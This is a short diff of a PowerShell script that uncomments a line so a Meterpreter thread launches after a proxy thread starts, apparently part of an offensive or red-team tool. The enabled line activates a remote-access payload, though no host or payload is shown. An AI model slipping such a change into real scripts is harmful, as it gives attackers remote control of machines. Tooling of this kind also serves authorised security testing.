@@ -163,7 +163,7 @@ try {
 	$AsyncProxyJobResult = $proxyThread.BeginInvoke()
 
 	Sleep 2 # Wait 2 seconds to give some time for the proxy to be ready
-#	$AsyncMeterpreterJobResult = $meterpreterThread.BeginInvoke()
+	$AsyncMeterpreterJobResult = $meterpreterThread.BeginInvoke()
 }
 catch {
 	$ErrorMessage = $_.Exception.Message
